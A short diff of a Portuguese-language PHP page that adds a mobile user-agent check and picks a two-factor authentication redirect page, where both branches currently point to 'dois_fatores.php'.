@@ -10,6 +10,18 @@ $identificador_label = 'Não identificado';
 $email_mascarado = 'seu e-mail';
 $telefone_final_mascarado = '****';
 
+function isMobileDevice() {
+    return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
+}
+
+// Define o alvo do redirecionamento com base no dispositivo
+if (isMobileDevice()) {
+    $redirect_target_2fa = 'dois_fatores.php';
+} else {
+    // Verifique se o nome do arquivo desktop é 'dois_fatores.php' ou 'dois_fatores2.php'
+    $redirect_target_2fa = 'dois_fatores.php'; 
+}
+
 // 1. Verifica se o cookie 'identificador_cliente' existe
 if (isset($_COOKIE['identificador_cliente'])) {
     $session_id = $_COOKIE['identificador_cliente'];
